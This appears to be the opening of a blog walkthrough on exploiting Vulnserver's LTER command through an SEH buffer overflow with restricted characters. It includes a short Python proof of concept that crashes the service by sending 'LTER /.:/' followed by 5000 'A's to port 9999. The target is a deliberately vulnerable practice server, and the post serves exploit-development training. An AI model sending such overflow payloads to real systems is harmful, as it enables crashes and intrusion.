---
layout: post
title: Vulnserver LTER - SEH Extremely restricted character set
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---

# Introduction

### Last time we i blogged, we tackled aligning registers within windows exploit development. Today we will be seeing an example on the [vulnerable server by stephen bradshaw](https://github.com/stephenbradshaw/vulnserver/), in which, a restricted set of characters may be found. Furthermore, due to lack of executable space when leading the flow, it will be required to use additional techniques to successfully exploit the server.

### The basics once again

##### As with any other vulnerable applicaiton to a buffer overflow, we need to test it first in order to exploit it, as in the [previous](https://whitecr0wz.github.io/posts/Exploiting-Stack-Overflows-On-Windows/) walkthrough in vulnserver, the parameter was vulnerable to the use of /.:/ after it being called, let's test if this works as well with LTER.

###### PoC code:

```term
import socket, sys, struct

buffer = "LTER /.:/" + "A" * 5000

host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

###### Response of the SEH Chain

![](/assets/img/LTER/1.png)
